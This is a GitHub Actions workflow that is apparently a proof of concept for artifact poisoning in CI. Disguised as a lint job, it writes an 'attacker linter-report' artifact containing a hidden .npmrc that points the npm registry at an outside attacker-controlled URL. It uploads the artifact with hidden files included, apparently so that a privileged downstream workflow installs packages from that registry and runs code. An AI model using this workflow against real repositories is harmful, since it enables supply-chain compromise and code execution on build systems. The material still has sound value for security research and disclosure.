name: Lint
on:
  pull_request:
    branches: [main]
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Create attacker linter-report artifact
        run: |
          mkdir -p payload
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-adp-lint-rce/main/reg/\naudit=false\nfund=false\nprogress=false\n' > payload/.npmrc
          printf 'Attacker-controlled linter report.\n' > payload/linter-report.txt
          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
          ls -la payload
          cat payload/.npmrc
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: payload/
          include-hidden-files: true
